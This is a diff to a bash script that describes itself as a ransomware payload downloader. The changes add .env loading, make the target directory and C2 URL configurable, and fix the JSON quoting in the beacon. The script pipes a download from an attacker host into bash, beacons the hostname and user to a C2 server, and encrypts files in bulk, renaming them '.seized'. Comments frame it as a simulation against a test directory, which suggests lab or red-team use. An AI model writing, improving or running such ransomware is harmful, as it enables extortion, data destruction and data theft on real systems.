@@ -2,27 +2,66 @@
 # Payload Downloader: Fetches ransomware from C2 or inline, executes
 # Trigger: curl -s http://attacker-ip:8000/payload_downloader.sh | bash
 
-C2_URL="http://attacker-ip:8080"  # Replace with actual C2 IP
-RANSOM_URL="$C2_URL/ransomware.sh"  # But inline for self-contained
+resolve_env_file() {
+    local candidate
+
+    candidate="${ENV_FILE_PATH:-}"
+    if [[ -n "$candidate" && -f "$candidate" ]]; then
+        printf '%s\n' "$candidate"
+        return 0
+    fi
+
+    if [[ -f .env ]]; then
+        printf '%s\n' "$(pwd)/.env"
+        return 0
+    fi
+
+    local source_path="${BASH_SOURCE[0]:-$0}"
+    if [[ -f "$source_path" ]]; then
+        local script_dir
+        script_dir="$(cd "$(dirname "$source_path")" 2>/dev/null && pwd)"
+        if [[ -n "$script_dir" && -f "$script_dir/.env" ]]; then
+            printf '%s\n' "$script_dir/.env"
+            return 0
+        fi
+    fi
+
+    return 1
+}
+
+if env_file_path=$(resolve_env_file); then
+    set -a
+    # shellcheck disable=SC1090
+    source "$env_file_path"
+    set +a
+fi
+
+C2_URL="${C2_URL:-http://attacker-ip:8080}"  # Replace with actual C2 IP
+TARGET_DIR="${TARGET_DIR:-/tmp/test_victim}"
+ENCRYPTED_EXT="${ENCRYPTED_EXT:-.seized}"
+
+RANSOM_URL="${RANSOM_URL:-$C2_URL/ransomware.sh}"  # But inline for self-contained
 
 # Fetch ransomware (or use inline below)
 # curl -s "$RANSOM_URL" > /tmp/ransom.sh && chmod +x /tmp/ransom.sh && /tmp/ransom.sh
+
+export C2_URL TARGET_DIR ENCRYPTED_EXT
 
 # Inline ransomware for direct exec (simulates fetch)
 RANSOM_PAYLOAD=$(cat << 'EOF'
 #!/bin/bash
 # Ransomware Core: Encrypts, beacons to C2, exfils fake data
-TARGET_DIR="/tmp/test_victim"
+TARGET_DIR="${TARGET_DIR:-/tmp/test_victim}"
 KEY="ransomkey-$(date +%s)-$(uuidgen | cut -d- -f1)"
 IV=$(openssl rand -hex 16)
-ENCRYPTED_EXT=".seized"
-C2_ENDPOINT="$C2_URL"
+ENCRYPTED_EXT="${ENCRYPTED_EXT:-.seized}"
+C2_ENDPOINT="${C2_URL:-http://attacker-ip:8080}"
 
 # Beacon to C2
 beacon_to_c2() {
     curl -s -X POST "$C2_ENDPOINT/beacon" \
          -H "Content-Type: application/json" \
-         -d "{\"hostname\": \"$(hostname)\", \"user\": \"$(whoami)\", \"pid\": $$}\" >/dev/null
+         -d "{\"hostname\": \"$(hostname)\", \"user\": \"$(whoami)\", \"pid\": $$}" >/dev/null
 }
 
 # Exfil fake victim data
@@ -62,7 +101,7 @@ sleep 2  # Simulate delay
 seized_count=0
 export -f encrypt_file
 export TARGET_DIR KEY IV ENCRYPTED_EXT
-find "$TARGET_DIR" -type f ! -name "README.txt" ! -name "*seized*" -print0 | xargs -0 -I {} -P 4 bash -c 'encrypt_file "$@"' _ {}
+find "$TARGET_DIR" -type f ! -name "README.txt" ! -name "*${ENCRYPTED_EXT}" -print0 | xargs -0 -I {} -P 4 bash -c 'encrypt_file "$@"' _ {}
 echo "Seized $seized_count assets."
 
 # Ransom note
